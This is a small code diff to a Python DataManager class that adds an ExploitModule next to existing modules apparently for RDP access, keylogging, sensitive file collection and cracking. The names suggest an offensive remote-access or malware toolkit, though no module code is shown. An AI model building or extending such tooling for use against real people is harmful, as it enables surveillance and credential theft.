@@ -6,6 +6,7 @@ from modules.RdpModule import RdpModule
 from modules.KeyloggerModule import KeyloggerModule
 from modules.SensitiveFilesModule import SensitiveFilesModule
 from modules.CrackModule import CrackModule
+from modules.ExploitModule import ExploitModule
 from dotenv import load_dotenv
 load_dotenv()
 
@@ -17,6 +18,7 @@ class DataManager:
         self.keylogger_module = KeyloggerModule(self.user_repository)
         self.sensitive_files_module = SensitiveFilesModule(self.user_repository)
         self.crack_module = CrackModule(self.user_repository)
+        self.exploit_module = ExploitModule(self.user_repository)
         self.lock = asyncio.Lock()
     
         
